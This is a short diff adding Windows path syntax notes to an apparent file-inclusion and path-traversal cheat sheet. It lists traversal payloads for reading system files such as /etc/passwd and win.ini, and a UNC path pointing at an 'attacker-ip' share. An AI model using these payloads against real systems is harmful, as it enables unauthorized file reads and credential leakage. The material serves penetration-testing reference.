@@ -102,6 +102,10 @@ if(req.query.language) {
 * **Common readable files**
   * Linux: `/etc/passwd`
   * Windows: `C:\Windows\boot.ini`&#x20;
+* **Windows path syntax notes**
+  * Backslash and forward slash both work on Windows/PHP: `..\..\windows\win.ini` and `../../windows/win.ini` are equivalent.
+  * UNC paths can also be referenced if the include function resolves them: `\\attacker-ip\share\file.txt`
+  * Drive letters can be used directly: `C:\Windows\win.ini` or `C:/Windows/win.ini`
 
 #### Path Traversal <a href="#path-traversal" id="path-traversal"></a>
 
